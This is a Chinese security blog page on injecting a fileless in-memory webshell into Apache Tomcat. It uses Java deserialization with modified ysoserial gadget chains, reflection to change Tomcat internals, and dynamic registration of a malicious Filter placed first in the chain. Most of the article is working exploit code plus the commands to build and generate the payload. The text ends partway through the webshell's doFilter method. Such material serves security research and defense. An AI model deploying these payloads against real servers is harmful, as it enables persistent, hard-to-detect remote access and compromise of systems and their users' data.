@@ -1,0 +1,767 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="基于Tomcat的内存Webshell 无文件攻击技术0x01 tomcat通用的获取request和response首先我们看看一个普通http请求进来的时候，tomcat的部分执行栈： at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at o">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/Tomcat/%E5%9F%BA%E4%BA%8ETomcat%E7%9A%84%E5%86%85%E5%AD%98Webshell%20%E6%97%A0%E6%96%87%E4%BB%B6%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="基于Tomcat的内存Webshell 无文件攻击技术0x01 tomcat通用的获取request和response首先我们看看一个普通http请求进来的时候，tomcat的部分执行栈： at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at o">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://she11c0de.github.io/resource/%E5%9F%BA%E4%BA%8ETomcat%E7%9A%84%E5%86%85%E5%AD%98Webshell%E6%97%A0%E6%96%87%E4%BB%B6%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/media/rId27.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/%E5%9F%BA%E4%BA%8ETomcat%E7%9A%84%E5%86%85%E5%AD%98Webshell%E6%97%A0%E6%96%87%E4%BB%B6%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/media/rId28.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/%E5%9F%BA%E4%BA%8ETomcat%E7%9A%84%E5%86%85%E5%AD%98Webshell%E6%97%A0%E6%96%87%E4%BB%B6%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/media/rId29.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/%E5%9F%BA%E4%BA%8ETomcat%E7%9A%84%E5%86%85%E5%AD%98Webshell%E6%97%A0%E6%96%87%E4%BB%B6%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/media/rId30.png">
+<meta property="article:published_time" content="2022-07-08T06:26:05.503Z">
+<meta property="article:modified_time" content="2022-07-08T07:24:51.402Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://she11c0de.github.io/resource/%E5%9F%BA%E4%BA%8ETomcat%E7%9A%84%E5%86%85%E5%AD%98Webshell%E6%97%A0%E6%96%87%E4%BB%B6%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/media/rId27.png">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-Tomcat/基于Tomcat的内存Webshell 无文件攻击技术" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Tomcat/%E5%9F%BA%E4%BA%8ETomcat%E7%9A%84%E5%86%85%E5%AD%98Webshell%20%E6%97%A0%E6%96%87%E4%BB%B6%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/" class="article-date">
+  <time datetime="2022-07-08T06:26:05.503Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="基于Tomcat的内存Webshell-无文件攻击技术"><a href="#基于Tomcat的内存Webshell-无文件攻击技术" class="headerlink" title="基于Tomcat的内存Webshell 无文件攻击技术"></a>基于Tomcat的内存Webshell 无文件攻击技术</h1><h2 id="0x01-tomcat通用的获取request和response"><a href="#0x01-tomcat通用的获取request和response" class="headerlink" title="0x01 tomcat通用的获取request和response"></a>0x01 tomcat通用的获取request和response</h2><p>首先我们看看一个普通http请求进来的时候，tomcat的部分执行栈：</p>
+<pre><code>at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
+at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
+at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:198)
+at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:96)
+at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:493)
+at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:140)
+at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:81)
+at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:87)
+at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:342)
+at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:800)
+at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:66)
+at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:806)
+at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1498)
+at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
+at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)
+at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)
+at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
+at java.lang.Thread.run(Thread.java:745)
+</code></pre>
+<p>按照kingkk师傅的方法，利用的点是在<br>org.apache.catalina.core.ApplicationFilterChain.internalDoFilter：</p>
+<pre><code>if (ApplicationDispatcher.WRAP_SAME_OBJECT) &#123;
+    lastServicedRequest.set(request);
+    lastServicedResponse.set(response);
+&#125;
+</code></pre>
+<p>其中，通过反射修改ApplicationDispatcher.WRAP_SAME_OBJECT为true，并且对lastServicedRequest和lastServicedResponse这两个ThreadLocal进行初始化，之后，每次请求进来，就能通过这两个ThreadLocal获取到相应的request和response了。但是，也存在一点小限制，在其set之前，看：</p>
+<pre><code>private void internalDoFilter(ServletRequest request,
+                                  ServletResponse response)
+    throws IOException, ServletException &#123;
+
+    // Call the next filter if there is one
+    if (pos &lt; n) &#123;
+        ApplicationFilterConfig filterConfig = filters[pos++];
+        try &#123;
+            Filter filter = filterConfig.getFilter();
+
+            if (request.isAsyncSupported() &amp;&amp; &quot;false&quot;.equalsIgnoreCase(
+                    filterConfig.getFilterDef().getAsyncSupported())) &#123;
+                request.setAttribute(Globals.ASYNC_SUPPORTED_ATTR, Boolean.FALSE);
+            &#125;
+            if( Globals.IS_SECURITY_ENABLED ) &#123;
+                final ServletRequest req = request;
+                final ServletResponse res = response;
+                Principal principal =
+                    ((HttpServletRequest) req).getUserPrincipal();
+
+                Object[] args = new Object[]&#123;req, res, this&#125;;
+                SecurityUtil.doAsPrivilege (&quot;doFilter&quot;, filter, classType, args, principal);
+            &#125; else &#123;
+                filter.doFilter(request, response, this);
+            &#125;
+        &#125; catch (IOException | ServletException | RuntimeException e) &#123;
+            throw e;
+        &#125; catch (Throwable e) &#123;
+            e = ExceptionUtils.unwrapInvocationTargetException(e);
+            ExceptionUtils.handleThrowable(e);
+            throw new ServletException(sm.getString(&quot;filterChain.filter&quot;), e);
+        &#125;
+        return;
+    &#125;
+
+    // We fell off the end of the chain -- call the servlet instance
+    try &#123;
+        if (ApplicationDispatcher.WRAP_SAME_OBJECT) &#123;
+            lastServicedRequest.set(request);
+            lastServicedResponse.set(response);
+        &#125;
+        ...
+    &#125; catch (IOException | ServletException | RuntimeException e) &#123;
+        throw e;
+    &#125; catch (Throwable e) &#123;
+        e = ExceptionUtils.unwrapInvocationTargetException(e);
+        ExceptionUtils.handleThrowable(e);
+        throw new ServletException(sm.getString(&quot;filterChain.servlet&quot;), e);
+    &#125; finally &#123;
+        if (ApplicationDispatcher.WRAP_SAME_OBJECT) &#123;
+            lastServicedRequest.set(null);
+            lastServicedResponse.set(null);
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+<p>先执行完所有的Filter了<code>filter.doFilter(request, response, this)</code></p>
+<p>因此，对于shiro的反序列化利用就没办法通过这种方式取到response回显了。</p>
+<h2 id="0x02-动态注册Filter"><a href="#0x02-动态注册Filter" class="headerlink" title="0x02 动态注册Filter"></a>0x02 动态注册Filter</h2><p>没错的，正如标题所说，通过动态注册一个Filter，并且把其放到最前面，这样，我们的Filter就能最先执行了，并且也成为了一个内存Webshell了。</p>
+<p>要实现动态注册Filter，需要两个步骤。第一个步骤就是先达到能获取request和response，而第二个步骤是通过request或者response去动态注册Filter</p>
+<h4 id="步骤一"><a href="#步骤一" class="headerlink" title="步骤一"></a>步骤一</h4><p>首先，我们创建一个继承AbstractTranslet（因为需要携带恶意字节码到服务端加载执行）的TomcatEchoInject类，在其静态代码块中<code>反射修改ApplicationDispatcher.WRAP_SAME_OBJECT为true，并且对lastServicedRequest和lastServicedResponse这两个ThreadLocal进行初始化</code></p>
+<pre><code>import com.sun.org.apache.xalan.internal.xsltc.DOM;
+import com.sun.org.apache.xalan.internal.xsltc.TransletException;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+
+/**
+ * @author threedr3am
+ */
+public class TomcatEchoInject  extends AbstractTranslet &#123;
+
+  static &#123;
+    try &#123;
+      /*刚开始反序列化后执行的逻辑*/
+      //修改 WRAP_SAME_OBJECT 值为 true
+      Class c = Class.forName(&quot;org.apache.catalina.core.ApplicationDispatcher&quot;);
+      java.lang.reflect.Field f = c.getDeclaredField(&quot;WRAP_SAME_OBJECT&quot;);
+      java.lang.reflect.Field modifiersField = f.getClass().getDeclaredField(&quot;modifiers&quot;);
+      modifiersField.setAccessible(true);
+      modifiersField.setInt(f, f.getModifiers() &amp; ~java.lang.reflect.Modifier.FINAL);
+      f.setAccessible(true);
+      if (!f.getBoolean(null)) &#123;
+        f.setBoolean(null, true);
+      &#125;
+
+      //初始化 lastServicedRequest
+      c = Class.forName(&quot;org.apache.catalina.core.ApplicationFilterChain&quot;);
+      f = c.getDeclaredField(&quot;lastServicedRequest&quot;);
+      modifiersField = f.getClass().getDeclaredField(&quot;modifiers&quot;);
+      modifiersField.setAccessible(true);
+      modifiersField.setInt(f, f.getModifiers() &amp; ~java.lang.reflect.Modifier.FINAL);
+      f.setAccessible(true);
+      if (f.get(null) == null) &#123;
+        f.set(null, new ThreadLocal());
+      &#125;
+
+      //初始化 lastServicedResponse
+      f = c.getDeclaredField(&quot;lastServicedResponse&quot;);
+      modifiersField = f.getClass().getDeclaredField(&quot;modifiers&quot;);
+      modifiersField.setAccessible(true);
+      modifiersField.setInt(f, f.getModifiers() &amp; ~java.lang.reflect.Modifier.FINAL);
+      f.setAccessible(true);
+      if (f.get(null) == null) &#123;
+        f.set(null, new ThreadLocal());
+      &#125;
+    &#125; catch (Exception e) &#123;
+      e.printStackTrace();
+    &#125;
+  &#125;
+
+  @Override
+  public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;
+
+  &#125;
+
+  @Override
+  public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler)
+      throws TransletException &#123;
+
+  &#125;
+&#125;
+</code></pre>
+<p>接着，我们改造一下ysoserial中的Gadgets.createTemplatesImpl方法</p>
+<pre><code>public static Object createTemplatesImpl ( final String command) throws Exception &#123;
+    return createTemplatesImpl(command, null);
+&#125;
+
+public static Object createTemplatesImpl ( final String command, final Class c ) throws Exception &#123;
+    if ( Boolean.parseBoolean(System.getProperty(&quot;properXalan&quot;, &quot;false&quot;)) ) &#123;
+        return createTemplatesImpl(
+            command, c,
+            Class.forName(&quot;org.apache.xalan.xsltc.trax.TemplatesImpl&quot;),
+            Class.forName(&quot;org.apache.xalan.xsltc.runtime.AbstractTranslet&quot;),
+            Class.forName(&quot;org.apache.xalan.xsltc.trax.TransformerFactoryImpl&quot;));
+    &#125;
+
+    return createTemplatesImpl(command, c, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
+&#125;
+
+
+public static &lt;T&gt; T createTemplatesImpl ( final String command, Class c, Class&lt;T&gt; tplClass, Class&lt;?&gt; abstTranslet, Class&lt;?&gt; transFactory )
+        throws Exception &#123;
+    final T templates = tplClass.newInstance();
+    final byte[] classBytes;
+    if (c == null) &#123;
+        // use template gadget class
+        ClassPool pool = ClassPool.getDefault();
+        pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
+        pool.insertClassPath(new ClassClassPath(abstTranslet));
+        final CtClass clazz = pool.get(StubTransletPayload.class.getName());
+        // run command in static initializer
+        // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
+        String cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;&quot; +
+            command.replaceAll(&quot;\\\\&quot;, &quot;\\\\\\\\&quot;).replaceAll(&quot;\&quot;&quot;, &quot;\\\&quot;&quot;) +
+            &quot;\&quot;);&quot;;
+        clazz.makeClassInitializer().insertAfter(cmd);
+        // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
+        clazz.setName(&quot;ysoserial.Pwner&quot; + System.nanoTime());
+        CtClass superC = pool.get(abstTranslet.getName());
+        clazz.setSuperclass(superC);
+        classBytes = clazz.toBytecode();
+    &#125; else &#123;
+        classBytes = ClassFiles.classAsBytes(c);
+    &#125;
+
+
+    // inject class bytes into instance
+    Reflections.setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][] &#123;
+        classBytes, ClassFiles.classAsBytes(Foo.class)
+    &#125;);
+
+    // required to make TemplatesImpl happy
+    Reflections.setFieldValue(templates, &quot;_name&quot;, &quot;Pwnr&quot;);
+    Reflections.setFieldValue(templates, &quot;_tfactory&quot;, transFactory.newInstance());
+    return templates;
+&#125;
+</code></pre>
+<p>可以看到，第二个传入的Class参数，我们并没有用到javassist，而是直接转字节数组，然后放到TemplatesImpl实例的_bytecodes字段中了。</p>
+<p>最后，回到ysoserial中有调用Gadgets.createTemplatesImpl的payload类中来，我这边对每一个都做了拷贝修改，例如CommonsCollections11，我拷贝其修改后的类为CommonsCollections11ForTomcatEchoInject，在调用<code>Gadgets.createTemplatesImpl(command[0];</code>的地方，改成了<code>final Object templates = Gadgets.createTemplatesImpl(null, TomcatEchoInject.class);</code></p>
+<p>并且，对ysoserial的main入口做一点小修改，因为原来的代码规定必须要有payload的入参，而我们这里不需要了</p>
+<p>ysoserial.GeneratePayload#main：</p>
+<pre><code>if (args.length &lt; 1) &#123;
+    printUsage();
+    System.exit(USAGE_CODE);
+&#125;
+</code></pre>
+<p>在ysoserial执行maven指令生成jar包</p>
+<pre><code>mvn clean -Dmaven.test.skip=true compile assembly:assembly
+</code></pre>
+<p>这样，我们就能使用这个新的payload（CommonsCollections11ForTomcatEchoInject）了</p>
+<pre><code>java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections11ForTomcatEchoInject &gt; ~/tmp/TomcatShellInject.ysoserial
+</code></pre>
+<h4 id="步骤二"><a href="#步骤二" class="headerlink" title="步骤二"></a>步骤二</h4><p>在使用步骤一生成的序列化数据进行反序列化攻击后，我们就能通过下面这段代码获取到request和response对象了</p>
+<pre><code>java.lang.reflect.Field f = org.apache.catalina.core.ApplicationFilterChain.class.getDeclaredField(&quot;lastServicedRequest&quot;);
+f.setAccessible(true);
+ThreadLocal t = (ThreadLocal) f.get(null);
+//不为空则意味着第一次反序列化的准备工作已成功
+ServletRequest servletRequest = (ServletRequest) t.get()
+</code></pre>
+<p>接着，我们要做的就是动态注册Filter到tomcat中，参考<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/cbe1c3174d41">《动态注册之Servlet+Filter+Listener》</a>，可以看到，其中通过ServletContext对象（实际获取的是ApplicationContext，是ServletContext的实现，因为门面模式的使用，后面需要提取实际实现），实现了动态注册Filter</p>
+<pre><code>javax.servlet.FilterRegistration.Dynamic filterRegistration = servletContext.addFilter(&quot;threedr3am&quot;, threedr3am);
+filterRegistration.setInitParameter(&quot;encoding&quot;, &quot;utf-8&quot;);
+filterRegistration.setAsyncSupported(false);
+filterRegistration.addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST), false, new String[]&#123;&quot;/*&quot;&#125;);
+</code></pre>
+<p>然而实际上并不管用，为什么呢？</p>
+<pre><code>private Dynamic addFilter(String filterName, String filterClass, Filter filter) throws IllegalStateException &#123;
+    if (filterName != null &amp;&amp; !filterName.equals(&quot;&quot;)) &#123;
+      if (!this.context.getState().equals(LifecycleState.STARTING_PREP)) &#123;
+        throw new IllegalStateException(sm.getString(&quot;applicationContext.addFilter.ise&quot;, new Object[]&#123;this.getContextPath()&#125;));
+      &#125; else &#123;
+        FilterDef filterDef = this.context.findFilterDef(filterName);
+        if (filterDef == null) &#123;
+          filterDef = new FilterDef();
+          filterDef.setFilterName(filterName);
+          this.context.addFilterDef(filterDef);
+        &#125; else if (filterDef.getFilterName() != null &amp;&amp; filterDef.getFilterClass() != null) &#123;
+          return null;
+        &#125;
+
+        if (filter == null) &#123;
+          filterDef.setFilterClass(filterClass);
+        &#125; else &#123;
+          filterDef.setFilterClass(filter.getClass().getName());
+          filterDef.setFilter(filter);
+        &#125;
+
+        return new ApplicationFilterRegistration(filterDef, this.context);
+      &#125;
+    &#125; else &#123;
+      throw new IllegalArgumentException(sm.getString(&quot;applicationContext.invalidFilterName&quot;, new Object[]&#123;filterName&#125;));
+    &#125;
+&#125;
+</code></pre>
+<p>因为<code>this.context.getState()</code>在运行时返回的state已经是<code>LifecycleState.STARTED</code>了，所以直接就抛异常了，filter根本就添加不进去。</p>
+<p>不过问题不大，因为<code>this.context.getState()</code>获取的是ServletContext实现对象的context字段，从其中获取出state，那么，我们在其添加filter前，通过反射设置成<code>LifecycleState.STARTING_PREP</code>，在其顺利添加完成后，再把其恢复成<code>LifecycleState.STARTE</code>，这里必须要恢复，要不然会造成服务不可用。</p>
+<p>其实上面的反射设置state值，也可以不做，因为我们看代码中，只是执行了<code>this.context.addFilterDef(filterDef)</code>，我们完全也可以通过反射context这个字段自行添加filterDef。</p>
+<p>在实际执行栈中，可以看到，实际filter的创建是在org.apache.catalina.core.StandardWrapperValve#invoke执行<code>ApplicationFilterChain filterChain = ApplicationFilterFactory.createFilterChain(request, wrapper, servlet);</code>的地方</p>
+<p>跟进其实现方法，忽略不重要的代码：</p>
+<pre><code>...
+StandardContext context = (StandardContext) wrapper.getParent();
+FilterMap filterMaps[] = context.findFilterMaps();
+...
+// Add the relevant path-mapped filters to this filter chain
+for (int i = 0; i &lt; filterMaps.length; i++) &#123;
+    if (!matchDispatcher(filterMaps[i] ,dispatcher)) &#123;
+        continue;
+    &#125;
+    if (!matchFiltersURL(filterMaps[i], requestPath))
+        continue;
+    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig)
+        context.findFilterConfig(filterMaps[i].getFilterName());
+    if (filterConfig == null) &#123;
+        // FIXME - log configuration problem
+        continue;
+    &#125;
+    filterChain.addFilter(filterConfig);
+&#125;
+</code></pre>
+<p>可以看到，从context提取了FilterMap数组，并且遍历添加到filterChain，最终生效，但是这里有两个问题：</p>
+<ol>
+<li> 我们最早创建的filter被封装成FilterDef添加到了context的filterDefs中，但是filterMaps中并不存在</li>
+<li> 跟上述一样的问题，也不存在filterConfigs中（<code>context.findFilterConfig</code>是从context的filterConfigs中获取）</li>
+</ol>
+<p>这两个问题，也比较简单，第一个问题，其实在下面代码执行<code>filterRegistration.addMappingForUrlPatterns</code>的时候已经添加进去了</p>
+<pre><code>javax.servlet.FilterRegistration.Dynamic filterRegistration = servletContext.addFilter(&quot;threedr3am&quot;, threedr3am);
+filterRegistration.setInitParameter(&quot;encoding&quot;, &quot;utf-8&quot;);
+filterRegistration.setAsyncSupported(false);
+filterRegistration.addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST), false, new String[]&#123;&quot;/*&quot;&#125;);
+public void addMappingForUrlPatterns(EnumSet&lt;DispatcherType&gt; dispatcherTypes, boolean isMatchAfter, String... urlPatterns) &#123;
+    FilterMap filterMap = new FilterMap();
+    filterMap.setFilterName(this.filterDef.getFilterName());
+    if (dispatcherTypes != null) &#123;
+      Iterator var5 = dispatcherTypes.iterator();
+
+      while(var5.hasNext()) &#123;
+        DispatcherType dispatcherType = (DispatcherType)var5.next();
+        filterMap.setDispatcher(dispatcherType.name());
+      &#125;
+    &#125;
+
+    if (urlPatterns != null) &#123;
+      String[] var9 = urlPatterns;
+      int var10 = urlPatterns.length;
+
+      for(int var7 = 0; var7 &lt; var10; ++var7) &#123;
+        String urlPattern = var9[var7];
+        filterMap.addURLPattern(urlPattern);
+      &#125;
+
+      if (isMatchAfter) &#123;
+        this.context.addFilterMap(filterMap);
+      &#125; else &#123;
+        this.context.addFilterMapBefore(filterMap);
+      &#125;
+    &#125;
+
+&#125;
+</code></pre>
+<p>而第二个问题，既然没有，我们就反射加进去就行了，不过且先看看StandardContext，它有一个方法<code>filterStart</code></p>
+<pre><code>public boolean filterStart() &#123;
+    if (this.getLogger().isDebugEnabled()) &#123;
+      this.getLogger().debug(&quot;Starting filters&quot;);
+    &#125;
+
+    boolean ok = true;
+    synchronized(this.filterConfigs) &#123;
+      this.filterConfigs.clear();
+      Iterator var3 = this.filterDefs.entrySet().iterator();
+
+      while(var3.hasNext()) &#123;
+        Entry&lt;String, FilterDef&gt; entry = (Entry)var3.next();
+        String name = (String)entry.getKey();
+        if (this.getLogger().isDebugEnabled()) &#123;
+          this.getLogger().debug(&quot; Starting filter &#39;&quot; + name + &quot;&#39;&quot;);
+        &#125;
+
+        try &#123;
+          ApplicationFilterConfig filterConfig = new ApplicationFilterConfig(this, (FilterDef)entry.getValue());
+          this.filterConfigs.put(name, filterConfig);
+        &#125; catch (Throwable var8) &#123;
+          Throwable t = ExceptionUtils.unwrapInvocationTargetException(var8);
+          ExceptionUtils.handleThrowable(t);
+          this.getLogger().error(sm.getString(&quot;standardContext.filterStart&quot;, new Object[]&#123;name&#125;), t);
+          ok = false;
+        &#125;
+      &#125;
+
+      return ok;
+    &#125;
+&#125;
+</code></pre>
+<p>没错，它遍历了filterDefs，一个个实例化成ApplicationFilterConfig添加到filterConfigs了。</p>
+<p>这两个问题解决了，是不是就完成了呢，其实还没有，还差一个优化的地方，因为我们想要把filter放到最前面，在所有filter前执行，从而解决shiro漏洞的问题。</p>
+<p>也简单，我们看回<code>org.apache.catalina.core.ApplicationFilterFactory#createFilterChain</code>的代码：</p>
+<pre><code>// Add the relevant path-mapped filters to this filter chain
+for (int i = 0; i &lt; filterMaps.length; i++) &#123;
+    if (!matchDispatcher(filterMaps[i] ,dispatcher)) &#123;
+        continue;
+    &#125;
+    if (!matchFiltersURL(filterMaps[i], requestPath))
+        continue;
+    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig)
+        context.findFilterConfig(filterMaps[i].getFilterName());
+    if (filterConfig == null) &#123;
+        // FIXME - log configuration problem
+        continue;
+    &#125;
+&#125;
+</code></pre>
+<p>创建的顺序是根据filterMaps的顺序来的，那么我们就有必要去修改我们添加的filter顺序到第一位了，最后，整个第二步骤的代码如下：</p>
+<pre><code>import com.sun.org.apache.xalan.internal.xsltc.DOM;
+import com.sun.org.apache.xalan.internal.xsltc.TransletException;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+import java.io.IOException;
+import javax.servlet.Filter;
+import javax.servlet.FilterChain;
+import javax.servlet.FilterConfig;
+import javax.servlet.ServletException;
+import javax.servlet.ServletRequest;
+import javax.servlet.ServletResponse;
+
+/**
+ * @author threedr3am
+ */
+public class TomcatShellInject extends AbstractTranslet implements Filter &#123;
+
+    static &#123;
+        try &#123;
+            /*shell注入，前提需要能拿到request、response等*/
+            java.lang.reflect.Field f = org.apache.catalina.core.ApplicationFilterChain.class
+                .getDeclaredField(&quot;lastServicedRequest&quot;);
+            f.setAccessible(true);
+            ThreadLocal t = (ThreadLocal) f.get(null);
+            ServletRequest servletRequest = null;
+            //不为空则意味着第一次反序列化的准备工作已成功
+            if (t != null &amp;&amp; t.get() != null) &#123;
+                servletRequest = (ServletRequest) t.get();
+            &#125;
+            if (servletRequest != null) &#123;
+                javax.servlet.ServletContext servletContext = servletRequest.getServletContext();
+                org.apache.catalina.core.StandardContext standardContext = null;
+                //判断是否已有该名字的filter，有则不再添加
+                if (servletContext.getFilterRegistration(&quot;threedr3am&quot;) == null) &#123;
+                    //遍历出标准上下文对象
+                    for (; standardContext == null; ) &#123;
+                        java.lang.reflect.Field contextField = servletContext.getClass().getDeclaredField(&quot;context&quot;);
+                        contextField.setAccessible(true);
+                        Object o = contextField.get(servletContext);
+                        if (o instanceof javax.servlet.ServletContext) &#123;
+                            servletContext = (javax.servlet.ServletContext) o;
+                        &#125; else if (o instanceof org.apache.catalina.core.StandardContext) &#123;
+                            standardContext = (org.apache.catalina.core.StandardContext) o;
+                        &#125;
+                    &#125;
+                    if (standardContext != null) &#123;
+                        //修改状态，要不然添加不了
+                        java.lang.reflect.Field stateField = org.apache.catalina.util.LifecycleBase.class
+                            .getDeclaredField(&quot;state&quot;);
+                        stateField.setAccessible(true);
+                        stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTING_PREP);
+                        //创建一个自定义的Filter马
+                        Filter threedr3am = new TomcatShellInject();
+                        //添加filter马
+                        javax.servlet.FilterRegistration.Dynamic filterRegistration = servletContext
+                            .addFilter(&quot;threedr3am&quot;, threedr3am);
+                        filterRegistration.setInitParameter(&quot;encoding&quot;, &quot;utf-8&quot;);
+                        filterRegistration.setAsyncSupported(false);
+                        filterRegistration
+                            .addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST), false,
+                                new String[]&#123;&quot;/*&quot;&#125;);
+                        //状态恢复，要不然服务不可用
+                        if (stateField != null) &#123;
+                            stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTED);
+                        &#125;
+
+                        if (standardContext != null) &#123;
+                            //生效filter
+                            java.lang.reflect.Method filterStartMethod = org.apache.catalina.core.StandardContext.class
+                                .getMethod(&quot;filterStart&quot;);
+                            filterStartMethod.setAccessible(true);
+                            filterStartMethod.invoke(standardContext, null);
+
+                            //把filter插到第一位
+                            org.apache.tomcat.util.descriptor.web.FilterMap[] filterMaps = standardContext
+                                .findFilterMaps();
+                            for (int i = 0; i &lt; filterMaps.length; i++) &#123;
+                                if (filterMaps[i].getFilterName().equalsIgnoreCase(&quot;threedr3am&quot;)) &#123;
+                                    org.apache.tomcat.util.descriptor.web.FilterMap filterMap = filterMaps[i];
+                                    filterMaps[i] = filterMaps[0];
+                                    filterMaps[0] = filterMap;
+                                    break;
+                                &#125;
+                            &#125;
+                        &#125;
+                    &#125;
+                &#125;
+            &#125;
+        &#125; catch (Exception e) &#123;
+            e.printStackTrace();
+        &#125;
+    &#125;
+
+    @Override
+    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;
+
+    &#125;
+
+    @Override
+    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler)
+        throws TransletException &#123;
+
+    &#125;
+
+    @Override
+    public void init(FilterConfig filterConfig) throws ServletException &#123;
+
+    &#125;
+
+    @Override
+    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse,
